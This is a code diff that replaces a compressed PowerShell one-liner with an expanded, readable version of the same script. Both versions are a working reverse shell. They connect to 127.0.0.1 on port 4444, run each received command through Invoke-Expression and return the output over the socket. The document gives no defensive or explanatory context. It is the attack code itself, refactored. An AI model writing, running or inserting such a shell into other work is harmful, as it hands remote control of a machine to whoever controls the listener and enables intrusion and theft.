@@ -1,1 +1,20 @@
-$sm=(New-Object Net.Sockets.TCPClient("127.0.0.1",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+$tcpClient = New-Object Net.Sockets.TCPClient("127.0.0.1", 4444)
+$stream = $tcpClient.GetStream()
+$bufferSize = 4096
+
+while ($true) {
+    $buffer = New-Object byte[] $bufferSize
+    $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
+
+    if ($bytesRead -eq 0) {
+        break
+    }
+
+    $receivedData = [Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
+    $commandOutput = Invoke-Expression -Command $receivedData 2>&1
+    $encodedOutput = [Text.Encoding]::ASCII.GetBytes($commandOutput)
+
+    $stream.Write($encodedOutput, 0, $encodedOutput.Length)
+}
+
+$tcpClient.Close()
